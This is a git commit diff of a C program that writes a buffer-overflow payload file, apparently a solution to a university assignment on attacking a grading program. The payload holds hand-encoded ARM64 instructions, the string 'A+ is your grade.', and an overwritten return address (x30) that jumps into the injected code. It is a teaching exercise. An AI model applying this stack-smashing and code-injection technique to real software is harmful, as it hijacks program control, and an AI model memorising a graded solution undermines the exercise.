14e2cb704d6dd264a99bd4be624ba405b846e388
Maxwell Lin <ml7013@princeton.edu>
2022-12-12 20:57:50 -0500

    aplus

--- createdataAplus.c
+++ createdataAplus.c
@@ -8,10 +8,10 @@ int main(void)
     unsigned int uiData3;
 
     ulData1 = 0x42006c; /* address to the instructions below; */
-    uiData2 = 0x52800821; /* mov w1, #0x41 */
-    uiData3 = 0x17FF81FB; /* b 0x40085c */
+    uiData2 = 0x10000041; /* adr x1, 0x420074 */
+    uiData3 = 0x17FF8201; /* b 0x400888 */
 
-    psFile = fopen("dataA", "w");
+    psFile = fopen("dataAplus", "w");
 
     /* buf[0 - 17] */
     fprintf(psFile, "Maxwell and Melody");
@@ -22,8 +22,11 @@ int main(void)
     fwrite(&uiData2, sizeof(unsigned int), 1, psFile);
     /* buf[24-27] */
     fwrite(&uiData3, sizeof(unsigned int), 1, psFile);
-    /* buf[28-47] */
-    fprintf(psFile, "fillerfillerfillerfi");
+    /* buf[28-45] */
+    fprintf(psFile, "A+ is your grade.\n");
+    /* buf[46-47] */
+    fprintf(psFile, "%c", '\0');
+    fprintf(psFile, "%c", '\0');
     /* buf[48-55] (x30) */
     fwrite(&ulData1, sizeof(unsigned long), 1, psFile);
     /* buf[56] (newline in unused memory) */
